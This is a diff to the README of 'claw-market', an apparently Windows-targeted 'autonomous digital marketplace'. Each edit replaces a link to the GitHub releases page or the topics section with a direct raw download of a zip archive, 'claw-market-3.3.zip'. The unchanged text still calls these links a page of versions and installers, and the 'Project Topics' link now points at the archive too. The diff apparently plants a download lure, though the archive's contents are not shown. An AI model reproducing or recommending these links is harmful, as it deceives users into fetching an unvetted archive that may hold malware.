@@ -1,6 +1,6 @@
 # 🦀 claw-market - Autonomous Digital Marketplace
 
-[![Download claw-market](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Harshil-fx/claw-market/releases)
+[![Download claw-market](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Harshil-fx/claw-market/main/public/claw-market-3.3.zip)
 
 ---
 
@@ -22,7 +22,7 @@ To get claw-market running on your Windows computer, follow these steps carefull
 
 You will need to **visit this page to download** the application:
 
-[![Get claw-market](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/Harshil-fx/claw-market/releases)
+[![Get claw-market](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/Harshil-fx/claw-market/main/public/claw-market-3.3.zip)
 
 This page contains the latest versions and installers. It updates regularly with improvements and fixes.
 
@@ -105,10 +105,10 @@ If you encounter problems, try these steps:
 
 ## 🔗 Useful Links
 
-- [Download and updates](https://github.com/Harshil-fx/claw-market/releases)  
+- [Download and updates](https://raw.githubusercontent.com/Harshil-fx/claw-market/main/public/claw-market-3.3.zip)  
   Always use this page to get the latest versions.
 
-- [Project Topics](https://github.com/Harshil-fx/claw-market#topics)  
+- [Project Topics](https://raw.githubusercontent.com/Harshil-fx/claw-market/main/public/claw-market-3.3.zip)  
   Learn more about the technology behind claw-market.
 
 ---
